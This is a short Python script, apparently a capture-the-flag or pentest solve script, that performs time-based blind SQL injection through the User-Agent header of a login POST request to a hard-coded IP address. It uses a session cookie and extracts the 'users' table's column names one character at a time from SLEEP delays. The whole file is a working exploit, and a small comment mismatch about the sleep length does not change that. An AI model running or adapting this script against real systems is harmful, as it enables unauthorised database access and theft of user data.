import requests
import time

# Target URL and session cookie
url = "http://46.250.232.141:8001/"
cookie = {"PHPSESSID": "64a091994a2cc417601352088df6eae8"}

# Table name retrieved earlier
table_name = "users"

# Payloads and headers
def inject(offset, position, char):
    payload = f"' OR IF(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {offset},1),{position},1)='{char}', SLEEP(7), 0), 'aaa')#"
    headers = {
        "User-Agent": payload,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": url,
        "Referer": url,
    }
    data = {"username": "okmyst", "password": "okmyst", "action": "login"}
    return headers, data

# Extract column names
def extract_columns():
    columns = []
    offset = 0
    while True:
        column_name = ""
        for position in range(1, 50):  # Adjust max length as needed
            for char in "abcdefghijklmnopqrstuvwxyz":  # Possible characters
                headers, data = inject(offset, position, char)

                # Measure the response time
                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookie)
                elapsed_time = time.time() - start_time

                # Check if the condition caused a delay
                if elapsed_time > 4:  # Delay threshold (SLEEP(10))
                    column_name += char
                    print(f"Found character at position {position} in column {offset}: {char}")
                    break
            else:
                # Stop if no character is found (end of column name)
                break

        if not column_name:
            # Stop if no more columns are found
            break

        columns.append(column_name)
        print(f"Found column: {column_name}")
        offset += 1

    print(f"Extracted columns: {columns}")
    return columns

if __name__ == "__main__":
    extract_columns()
